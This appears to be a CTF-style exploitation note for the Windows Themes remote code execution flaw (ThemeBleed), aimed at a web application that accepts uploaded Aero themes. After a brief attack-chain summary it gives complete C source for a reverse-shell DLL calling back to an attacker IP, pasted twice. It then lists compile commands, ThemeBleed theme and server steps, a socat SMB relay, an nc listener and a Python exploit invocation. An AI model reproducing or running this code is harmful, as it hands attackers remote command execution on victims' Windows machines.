Web Application for Uploading Windows 11 Aero Themes is a concern due to the Windows Themes Remote Code Execution Vulnerability, as the infection chain is initiated by loading a weaponized THEME file on a compromised system with access to an attacker-controlled SMB share.


1. **Crafting the Malicious ".theme" File:** The attacker creates a ".theme" file that contains malicious code or references a ".msstyles" file manipulated with malicious content.
2. **Delivery to the Victim:** The attacker then tricks or persuades a user into downloading or opening this malicious ".theme" file through social engineering tactics, such as phishing emails, deceptive website downloads, or enticing file attachments.
3. **Exploiting the Vulnerability:** When the victim opens the compromised ".theme" file, the vulnerability within Windows 11 becomes triggered. Specifically, the flaw within the handling of ".msstyles" files can become exploited, allowing the attacker to execute arbitrary code on the victim's system.
4. **Remote Code Execution:** By successfully exploiting the vulnerability, the attacker can remotely execute their code or malicious binaries on the victim's system. This exploit grants the attacker unauthorized access and control over the compromised machine.


--> https://github.com/izenynn/c-reverse-shell
--> https://github.com/gabe-k/themebleed

```
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


static int ReverseShell(const char *CLIENT_IP, int CLIENT_PORT) {


	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}

	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}
void VerifyThemeVersion() {
  ReverseShell("10.10.14.104", 1234);
}

```

## Compile
`❯ x86_64-w64-mingw32-gcc main.c -shared -lws2_32 -o VerifyThemeVersion.dll` 

## COnfigure Theme on my windows machine
```
.\ThemeBleed.exe  make_theme 10.10.14.104 exploit.theme

# Copy the .exe that we make before into the data folder and rename it as stage_3
#start the server
.\ThemeBleed.exe  server

```

## Configure socat in my attacker machine
```
sudo socat TCP-LISTEN:445,fork,reuseaddr TCP:192.168.0.111:445

# listening reverse shell
nc -nlvp 1234
```


--------------

## Python version for executing on linux


https://github.com/Jnnshschl/CVE-2023-38146

```
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


static int ReverseShell(const char *CLIENT_IP, int CLIENT_PORT) {


	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		write(2, "[ERROR] WSASturtup failed.\n", 27);
		return (1);
	}

	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		return (1);
	}

	STARTUPINFO sinfo;
	memset(&sinfo, 0, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	sinfo.dwFlags = (STARTF_USESTDHANDLES);
	sinfo.hStdInput = (HANDLE)sockt;
	sinfo.hStdOutput = (HANDLE)sockt;
	sinfo.hStdError = (HANDLE)sockt;
	PROCESS_INFORMATION pinfo;
	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

	return (0);
}
void VerifyThemeVersion() {
  ReverseShell("10.10.14.104", 1234);
}

```

## Compile
`❯ x86_64-w64-mingw32-gcc main.c -shared -lws2_32 -o Aero.msstyles_vrf_evil.dll` 

```
pip3 install -r requirements.txt
python3 themebleed.py -r RHOST

```

